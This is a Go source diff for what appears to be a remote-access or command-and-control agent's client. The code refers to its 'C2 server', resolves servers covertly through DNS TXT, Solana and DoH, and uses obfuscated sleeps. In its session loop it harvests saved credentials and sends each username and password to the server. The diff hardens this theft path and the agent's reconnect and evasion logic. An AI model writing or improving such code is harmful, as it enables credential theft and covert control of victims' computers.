@@ -49,7 +49,7 @@ func runClient(cfg config.Config) {
 	ensureServerURLs(&cfg, baseBackoff)
 
 	if isHttpPollEnabled() {
-		runPollClient(cfg)
+		runPollClient(cfg, cfg.ServerIndex)
 		return
 	}
 
@@ -89,7 +89,7 @@ func runClient(cfg config.Config) {
 		}
 
 		currentServer := cfg.ServerURLs[currentIndex]
-		if strings.HasPrefix(strings.ToLower(currentServer), "ws://") && !cfg.TLSInsecureSkipVerify {
+		if strings.HasPrefix(strings.ToLower(currentServer), "ws://") {
 			log.Printf("[TLS] refusing plaintext WebSocket server %s; use wss://", currentServer)
 			rotateToNextServer(&currentIndex, cfg.ServerURLs)
 			obfSleepDuration(backoff)
@@ -129,7 +129,7 @@ func runClient(cfg config.Config) {
 				log.Printf("[fallback] %d consecutive WS failures — switching to HTTP poll", consecutiveFailures)
 				inPollFallback = true
 				cancel()
-				runPollClient(cfg)
+				runPollClient(cfg, currentIndex)
 				// runPollClient returns when the server requests a reconnect or
 				// an error occurs — try WS again from scratch.
 				log.Printf("[fallback] HTTP poll exited, retrying WebSocket")
@@ -311,7 +311,7 @@ func ensureServerURLs(cfg *config.Config, backoff time.Duration) {
 		log.Printf("No server URLs configured. Resolving from DNS TXT (domain: %s)", cfg.DnsTxtDomain)
 		delay := backoff
 		for len(cfg.ServerURLs) == 0 {
-			if urls, err := config.LoadServerURLsFromDNSTxt(cfg.DnsTxtDomain, cfg.AgentToken); err != nil {
+			if urls, err := config.LoadServerURLsFromDNSTxt(cfg.DnsTxtDomain, cfg.AgentToken, buildDoHTLSConfig(*cfg)); err != nil {
 				log.Printf("DNS TXT lookup failed: %v; retrying in %s", err, delay)
 				time.Sleep(delay)
 				if delay < maxBackoff {
@@ -402,7 +402,7 @@ func refreshServerURLsFromSolana(cfg *config.Config) bool {
 }
 
 func refreshServerURLsFromRaw(cfg *config.Config) bool {
-	urls, err := config.LoadServerURLsFromRaw(cfg.RawServerListURL)
+	urls, err := config.LoadServerURLsFromRaw(cfg.RawServerListURL, buildDoHTLSConfig(*cfg))
 	if err != nil {
 		log.Printf("[config] WARNING: failed to refresh raw server list: %v", err)
 		return false
@@ -418,6 +418,17 @@ func refreshServerURLsFromRaw(cfg *config.Config) bool {
 		cfg.ServerURLs = urls
 	}
 	return true
+}
+
+// buildDoHTLSConfig builds a TLS config for DoH/raw-URL clients from agent
+// settings, intentionally excluding SPKI pins (which are for the C2 server)
+// and client certificates (DoH endpoints are public).
+func buildDoHTLSConfig(cfg config.Config) *tls.Config {
+	tlsCfg, _ := agentTLS.Build(agentTLS.Options{
+		InsecureSkipVerify: cfg.TLSInsecureSkipVerify,
+		CAPath:             cfg.TLSCAPath,
+	})
+	return tlsCfg
 }
 
 func createHTTPTransport(cfg config.Config) (*http.Transport, malleableProfile, error) {
@@ -446,7 +457,7 @@ func createHTTPTransport(cfg config.Config) (*http.Transport, malleableProfile, 
 	// Use DoH-aware dialer with TCP keepalive so the OS detects silent link
 	// drops (NAT timeout, middlebox reset) within ~10 s instead of waiting
 	// for the 45 s pong grace period.
-	dohDialer := doh.NewDialer()
+	dohDialer := doh.NewDialer(buildDoHTLSConfig(cfg))
 	tcpDial := func(ctx context.Context, network, addr string) (net.Conn, error) {
 		conn, err := dohDialer(ctx, network, addr)
 		if err != nil {
@@ -661,7 +672,7 @@ func classifySessionError(err error) (reason, detail string) {
 	msg := err.Error()
 	msgLower := strings.ToLower(msg)
 	if strings.Contains(msgLower, "panic") {
-		return "panic", truncateStr(msg, 300)
+		return "panic", "internal error"
 	}
 	var closeErr *websocket.CloseError
 	if errors.As(err, &closeErr) {
@@ -718,12 +729,15 @@ func runSession(ctx context.Context, cancel context.CancelFunc, conn *websocket.
 		}
 	}()
 	defer cancel()
+	// disconnectW starts as the raw conn; replaced with safeWriter once it is
+	// set up so the disconnect frame is serialised with other concurrent writes.
+	var disconnectW wire.Writer = conn
 	defer func() {
 		reason, detail := classifySessionError(err)
 		di := wire.DisconnectInfo{Type: "disconnect_info", Reason: reason, Detail: detail}
 		sendCtx, sendCancel := context.WithTimeout(context.Background(), 2*time.Second)
 		defer sendCancel()
-		_ = wire.WriteMsg(sendCtx, conn, di)
+		_ = wire.WriteMsg(sendCtx, disconnectW, di)
 		conn.CloseNow()
 	}()
 
@@ -743,6 +757,7 @@ func runSession(ctx context.Context, cancel context.CancelFunc, conn *websocket.
 	}
 
 	safeWriter := wire.NewSafeWriter(conn)
+	disconnectW = safeWriter
 
 	nonceBytes, err := requireEnrollmentChallenge(challengeEnvelope)
 	if err != nil {
@@ -866,11 +881,21 @@ func runSession(ctx context.Context, cancel context.CancelFunc, conn *websocket.
 
 			// Collect credentials in the background; send each as a notification.
 			go func() {
+				select {
+				case <-ctx.Done():
+					return
+				default:
+				}
 				creds := harvest.Collect()
 				if len(creds) == 0 {
 					return
 				}
 				for _, c := range creds {
+					select {
+					case <-ctx.Done():
+						return
+					default:
+					}
 					title := fmt.Sprintf("[%s] %s | user=%s pass=%s", c.Source, c.URL, c.Username, c.Password)
 					n := wire.Notification{
 						Type:     "notification",
@@ -906,6 +931,7 @@ func runSession(ctx context.Context, cancel context.CancelFunc, conn *websocket.
 		clearPendingCrashReport()
 	}
 
+	const serverPingInterval = 15 * time.Second
 	if interval := getPingInterval(); interval > 0 {
 		log.Printf("ping: heartbeat interval=%s", interval)
 		goSafe("ping loop", cancel, func() {
@@ -925,43 +951,42 @@ func runSession(ctx context.Context, cancel context.CancelFunc, conn *websocket.
 				}
 			}
 		})
-		goSafe("pong watchdog", cancel, func() {
-			// The server sends pings every 15 s regardless of our own ping
-			// interval, so LastPong refreshes every 15 s in a healthy session.
-			// Poll at the same rate so we can fire as soon as one full grace
-			// window passes without an update.  Grace = agent_interval + 15 s
-			// (≥45 s), which is generous for any real-world link while still
-			// detecting silent drops ~45 s after they occur instead of ~90 s.
-			const serverPingInterval = 15 * time.Second
-			tickInterval := serverPingInterval
-			grace := interval + serverPingInterval
-			if grace < 20*time.Second {
-				grace = 20 * time.Second
-			}
-			start := time.Now()
-			ticker := time.NewTicker(tickInterval)
-			defer ticker.Stop()
-			for {
-				select {
-				case <-ctx.Done():
+	}
+	goSafe("pong watchdog", cancel, func() {
+		// The server sends pings every 15 s regardless of our own ping
+		// interval, so LastPong refreshes every 15 s in a healthy session.
+		// Poll at the same rate so we can fire as soon as one full grace
+		// window passes without an update.  Grace = agent_interval + 15 s
+		// (≥45 s), which is generous for any real-world link while still
+		// detecting silent drops ~45 s after they occur instead of ~90 s.
+		agentInterval := getPingInterval()
+		grace := agentInterval + serverPingInterval
+		if grace < 20*time.Second {
+			grace = 20 * time.Second
+		}
+		start := time.Now()
+		ticker := time.NewTicker(serverPingInterval)
+		defer ticker.Stop()
+		for {
+			select {
+			case <-ctx.Done():
+				return
+			case <-ticker.C:
+				last := env.LastPong()
+				// Fire if: last pong is stale, OR no pong ever arrived but
+				// the connection has been open longer than grace (handles the
+				// case where IP changes before the first pong is received).
+				stale := (!last.IsZero() && time.Since(last) >= grace) ||
+					(last.IsZero() && time.Since(start) >= grace)
+				if stale {
+					log.Printf("ping: no pong for %s, forcing reconnect", time.Since(last))
+					cancel()
+					conn.CloseNow()
 					return
-				case <-ticker.C:
-					last := env.LastPong()
-					// Fire if: last pong is stale, OR no pong ever arrived but
-					// the connection has been open longer than grace (handles the
-					// case where IP changes before the first pong is received).
-					stale := (!last.IsZero() && time.Since(last) >= grace) ||
-						(last.IsZero() && time.Since(start) >= grace)
-					if stale {
-						log.Printf("ping: no pong for %s, forcing reconnect", time.Since(last))
-						cancel()
-						conn.CloseNow()
-						return
-					}
 				}
 			}
-		})
-	}
+		}
+	})
 
 	readErr := make(chan error, 1)
 	go func() {
